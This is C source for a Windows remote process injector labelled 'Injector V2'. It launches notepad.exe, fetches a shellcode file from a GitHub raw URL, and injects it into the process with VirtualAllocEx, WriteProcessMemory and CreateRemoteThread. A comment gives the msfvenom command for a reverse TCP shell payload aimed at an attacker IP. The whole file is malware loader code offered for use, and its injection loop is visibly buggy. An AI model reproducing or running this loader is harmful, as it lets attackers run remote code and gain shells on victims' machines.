//Injector V2
// Remote Process Injection


#include <stdio.h>
#include <Windows.h>
#include <stdint.h>
#include <winnt.h>
#include <wininet.h>
#include <stdlib.h>
#include <string.h>
#include <windef.h>

#pragma comment(lib, "wininet.lib")

int main()
{

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	long int PID;
	
	

	HINTERNET hInternet, hConnect, hRequest;
    BOOL bResult;
	//LPVOID OutBuffer[5069];
	char* OutBuffer;
    DWORD dwBytesRead;
	DWORD dwSize;
    unsigned char buff[461];
	unsigned char Finaldownload[461];
	int counter = 0;
	
 
	if (!CreateProcessW(
	  L"C:\\Windows\\System32\\notepad.exe",
	  NULL,
	  NULL,
	  NULL,
	  FALSE,
	  BELOW_NORMAL_PRIORITY_CLASS,
	  NULL,
	  NULL,
	  &si,
	  &pi
	))
	  {
		  printf("(-) Failed to create process, error: %ld", GetLastError());
		  return EXIT_FAILURE;
	  }
	  
	  PID = pi.dwProcessId;
	  printf("(+) Process Started! pid: %ld\n", PID);
	  
	Sleep(2000);

	//shell code: msfvenom -p windows/x64/shell_reverse_tcp LHOST=attackerIP LPORT=Port -f c

	//void runshell(char* shellcode, DWORD shellcodeLen)
	
	//GET SHELL CODE
    // Initialize WinINet
    hInternet = InternetOpen("HTTP Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    // Connect to the server
    hConnect = InternetConnect(hInternet, "raw.githubusercontent.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    // Open a request
    hRequest = HttpOpenRequest(hConnect, "GET", "/lacouls/Public_download/refs/heads/main/injectorshell.bin", NULL, NULL, NULL, 0, 0);
	// Send the request
    HttpSendRequest(hRequest, NULL, 0, NULL, 0);
	Sleep(2000);
				
	// RUN SHELL CODE
		
			//PVOID BaseAddress = NULL;
			
			HANDLE targetProcessThread;
			//SIZE_T Alloc_dwSize = 0x2000;

			//handle that stores remote process handle
			HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
			
			//Close the handle
			//CloseHandle(targetProcessHandle); 
		
		
    
	// Read the response
	do 
	{
		dwSize = 0;
		//Allocate space for buffer.
		OutBuffer = (char*)malloc(dwSize + 1);
		//Test the data availability
		InternetQueryDataAvailable(hRequest, &dwSize, 0, 0);
		ZeroMemory(OutBuffer, dwSize + 1);
		//printf("test\n");	
		
		if (!InternetReadFile(hRequest, (LPVOID)OutBuffer, dwSize, &dwBytesRead))
		{
			printf("No data %u:\n", GetLastError());
		}
		else
		{			
			int i = 0;
			printf("sizeof DW: %d\n", dwSize);
			while (i < dwSize)
			{
		    memcpy(&buff[counter], &OutBuffer[i], sizeof(char));
			//printf("i:%d | dwSize:%d | Counter:%d | buff char:%c | psz char: %c\n", i, dwSize, counter, buff[counter], OutBuffer[i]);
			printf("%c", OutBuffer[i]);
			counter++;
			i++;
					
			//allocate memory in remote process
			void* exec_mem = VirtualAllocEx(targetProcessHandle, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			
			//Write buff to exe mem region
			WriteProcessMemory(targetProcessHandle, exec_mem, &OutBuffer[i], sizeof(dwSize), NULL);

			//creates a thread that executes in exec_mem region
			targetProcessThread = CreateRemoteThread(targetProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);

			} //closing while statement
			free(OutBuffer);
		} //closing else statement
			
			
			//OutBuffer = NULL;
			
	} while (dwSize > 0);
	printf("\n");
	printf("GoodBye\n");

		
    // Clean up
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

	
    return 0;
	
}
